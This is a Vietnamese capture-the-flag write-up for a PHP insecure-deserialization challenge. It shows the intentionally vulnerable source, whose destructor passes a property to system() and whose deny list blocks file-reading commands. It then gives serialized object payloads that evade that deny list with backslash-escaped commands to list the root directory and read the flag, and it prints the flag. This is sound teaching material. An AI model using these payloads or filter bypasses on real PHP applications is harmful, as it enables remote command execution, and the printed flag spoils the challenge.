# ⛳ Faster

- Description: Bạn có thể nhanh hơn throw Exception() không? http://45.122.249.68:10019
- Code:

```
<?php
class exploit_me
{
    public $cmd;
    public function __destruct(){
        system($this->cmd);
    }
}
$payload= $_GET['payload'];
if ($payload[0]==='a' || $payload[0]==='C')
{
    die('awwwww! this\'s the wrong way!');
}
else if (preg_match('/cat|ls|nl|head|less|more|tail|mv|base|grep|dir|\*|strings|sort|txt|find|print|tac|awk/is',$payload))
    die('awwwww! this\'s the wrong way!');
unserialize($payload);
throw new Exception("oh nooooooo!!!");
?>
```
## Write-up:

Đây là một bài **Insecure Deserialize** cơ bản với bộ lọc cho trước.
Filter(payload): `cat` | `ls` | `nl` | `head` | `less` | `more` | `tail` | `mv` | `base` | `grep` | `dir` | `*` | `strings` | `sort` | `txt` | `find` | `print` | `tac` | `awk`  
Ta exploit với việc **serialize** object trên, copy lại toàn bộ hàm, do class **exploit_me** không có khởi tạo giá trị cho **$cmd** nên ta thêm vào hàm **__construct** và khởi tạo bằng lệnh ta mong muốn. Ở đây ta thử lệnh `id` để không nằm trong bộ lọc.
```
<?php
class exploit_me
{
    public $cmd;
    public function __construct($command){
        $this->cmd= $command;
    }
    public function __destruct(){
        system($this->cmd);
    }
}

$vulner = new exploit_me("id");
$payload= serialize($vulner);
echo($payload."\n");
?>
```
Test thử kết quả và lấy giá trị đối tượng đã được serialize 

![image](https://user-images.githubusercontent.com/48288606/147397751-c7900eda-2b49-48a2-ae05-484165643e41.png)

Ta đưa vào biến **$payload**: `?payload=O:10:"exploit_me":1:{s:3:"cmd";s:2:"id";}`.

![image](https://user-images.githubusercontent.com/48288606/147397795-ccfee8ab-b916-4e99-ae5a-1c951b7681ce.png)

Với filter đơn giản vậy, ta sử dụng regex để bypass. Thay đổi đoạn code khởi tạo đối tượng trên thành `$vulner = new exploit_me("l\s");`. <br>
Ta có **$payload**: `O:10:"exploit_me":1:{s:3:"cmd";s:3:"l\s";}`

![image](https://user-images.githubusercontent.com/48288606/147397831-2499f171-a978-418f-9f0c-62e18f3e730e.png)

Vậy là ta đã execute command thành công qua việc bypass filter bằng regex. Ở đây chúng ta có 2 file là **index.php** và **source.php**. Đọc 2 file này ra không thấy có gì đặc biệt, chung một nội dung và là file source code. Ta thử liệt kê các file ở thư mục gốc. Payload: `?payload=O:10:"exploit_me":1:{s:3:"cmd";s:9:"l\s%20/%20-a%20";}`

![image](https://user-images.githubusercontent.com/48288606/147398460-edca852d-b577-4827-9a14-4aa7190809b5.png)

Ở đây có file **a8749209e3d652e_flag**. Thử đọc file này. Payload: `?payload=O:10:"exploit_me":1:{s:3:"cmd";s:27:"c\at  /a8749209e3d652e_flag";}`

![image](https://user-images.githubusercontent.com/48288606/147398483-2bb6d8f1-bc74-4063-8318-5c77620fcca9.png)

**NOTE**: Ở đây nếu chuẩn thì mình nghĩ nên dùng lệnh `find` kết hợp với regex để tìm file có dạng **"\*flag\*"**, vì ở đây đề cho cấm **wildcar** `*` nên phải suy nghĩ cách dùng regex hợp lý. Còn cách giải của mình thì mò file flag =)), với lại đường dẫn thư mục root `/` là đường dẫn nhạy cảm nên thường có flag ở đó.

Flag: **Wanna.One{Fast_detruct_is_tooooooooo_easy_for_you_!!!}**


